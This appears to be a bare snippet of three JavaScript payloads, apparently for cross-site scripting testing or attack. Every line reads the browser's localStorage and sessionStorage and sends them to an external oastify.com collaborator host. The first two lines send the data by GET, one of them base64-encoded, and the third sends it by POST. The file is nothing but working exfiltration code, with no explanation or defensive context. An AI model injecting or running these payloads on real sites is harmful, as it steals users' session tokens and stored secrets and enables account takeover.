fetch('https://6v28xhg3zh3402th5rbomil1rsxil7.oastify.com/?localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
fetch('https://6v28xhg3zh3402th5rbomil1rsxil7.oastify.com/?localStorage='+btoa(JSON.stringify(localStorage))+'&sessionStorage='+btoa(JSON.stringify(sessionStorage)), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
fetch('https://6v28xhg3zh3402th5rbomil1rsxil7.oastify.com/localStorage', {method: "POST", body: 'localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));
